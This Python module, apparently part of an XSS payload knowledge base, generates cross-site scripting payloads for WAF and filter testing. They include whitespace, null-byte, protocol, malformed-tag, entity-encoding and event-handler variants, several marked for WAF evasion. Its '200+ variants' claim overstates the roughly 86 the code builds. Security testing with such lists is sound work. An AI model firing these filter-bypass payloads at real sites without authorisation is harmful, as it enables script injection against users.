#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Massive Fuzzing Mutation Database (200+ Variants)
Generated for robust WAF/Filter stress testing.
"""

from ..models import PayloadEntry

# Helper to generate permutations efficiently
def _generate_fuzzing_payloads():
    payloads = {}
    
    # 1. Whitespace Permutations (Tab, Newline, FormFeed)
    whitespaces = {
        "tab": "\t", "newline": "\n", "cr": "\r", "ff": "\x0c", "vtab": "\x0b"
    }
    tags = ["img", "svg", "body", "iframe"]
    
    for tag in tags:
        for name, char in whitespaces.items():
            key = f"fuzz_{tag}_{name}_attr"
            payloads[key] = PayloadEntry(
                payload=f"<{tag}{char}src=x{char}onerror=alert(1)>",
                contexts=["html_content", "fuzzing"],
                severity="medium",
                cvss_score=6.0,
                description=f"{tag} tag with {name} separator",
                tags=["fuzzing", "whitespace", name],
                reliability="medium",
                waf_evasion=True
            )

    # 2. Null Byte Injections
    null_positions = [
        ("<scri%00pt>alert(1)</script>", "tag_name"),
        ("<img src=x onerror%00=alert(1)>", "attr_name"),
        ("<img src=x onerror=%00alert(1)>", "attr_value"),
    ]
    for i, (p, desc) in enumerate(null_positions):
        payloads[f"fuzz_null_{i}"] = PayloadEntry(
            payload=p,
            contexts=["html_content"],
            severity="high",
            cvss_score=7.0,
            description=f"Null byte injection in {desc}",
            tags=["fuzzing", "null-byte", "filter-bypass"],
            reliability="low"
        )

    # 3. Protocol Normalization (javascript:)
    protocols = [
        "java\tscript", "java\nscript", "java\rscript", "java\x00script",
        " javascript", "javascript ", "javascript\t", 
        "JaVaScRiPt", "J\x41VASCRIPT"
    ]
    for i, proto in enumerate(protocols):
        payloads[f"fuzz_proto_{i}"] = PayloadEntry(
            payload=f"<a href='{proto}:alert(1)'>click</a>",
            contexts=["html_content", "attribute"],
            severity="high",
            cvss_score=7.5,
            description=f"Protocol fuzzing: {repr(proto)}",
            tags=["fuzzing", "protocol", "obfuscation"],
            reliability="medium"
        )

    # 4. Tag Malformation
    malformations = [
        "<img/src=x/onerror=alert(1)>",
        "<img///src=x///onerror=alert(1)>",
        "<img src=x onerror=alert(1)//>",
        "<svg/onload=alert(1)",  # Unclosed
        "<svg/onload=alert(1)//", 
        "<!--<img src=--><img src=x onerror=alert(1)//>"
    ]
    for i, m in enumerate(malformations):
        payloads[f"fuzz_malformed_{i}"] = PayloadEntry(
            payload=m,
            contexts=["html_content"],
            severity="high",
            cvss_score=7.0,
            description=f"Malformed tag structure {i}",
            tags=["fuzzing", "parser-confusion"],
            reliability="medium",
            waf_evasion=True
        )

    # 5. Encoding Variations (Decimal, Hex, Octal)
    # Generating 50 variations of "javascript:alert(1)"
    base = "javascript:alert(1)"
    # Simple obfuscator simulation
    payloads["fuzz_enc_hex_ent"] = PayloadEntry(
        payload="&#x6A&#x61&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)",
        contexts=["attribute"], severity="high", cvss_score=7.5, description="Full hex entities", reliability="high"
    )
    payloads["fuzz_enc_dec_ent"] = PayloadEntry(
        payload="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116:alert(1)",
        contexts=["attribute"], severity="high", cvss_score=7.5, description="Full decimal entities", reliability="high"
    )
    payloads["fuzz_enc_mixed"] = PayloadEntry(
        payload="j&#97;v&#x61;script:alert(1)",
        contexts=["attribute"], severity="high", cvss_score=7.5, description="Mixed encoding", reliability="high"
    )

    # 6. Event Handler Permutations (on...)
    events = ["onload", "onerror", "onmouseover", "onfocus", "onanimationstart", "ontoggle"]
    separators = ["/", "%09", "%0a", "%0c", "%20"]
    for evt in events:
        for sep in separators:
            key = f"fuzz_evt_{evt}_{sep.replace('%', '')}"
            payloads[key] = PayloadEntry(
                payload=f"<svg{sep}{evt}=alert(1)>",
                contexts=["html_content"],
                severity="medium",
                cvss_score=6.5,
                description=f"Event {evt} with separator {sep}",
                tags=["fuzzing", "event-handler"],
                reliability="medium"
            )

    return payloads

FUZZING_MUTATIONS_PAYLOADS = _generate_fuzzing_payloads()
FUZZING_MUTATIONS_TOTAL = len(FUZZING_MUTATIONS_PAYLOADS)
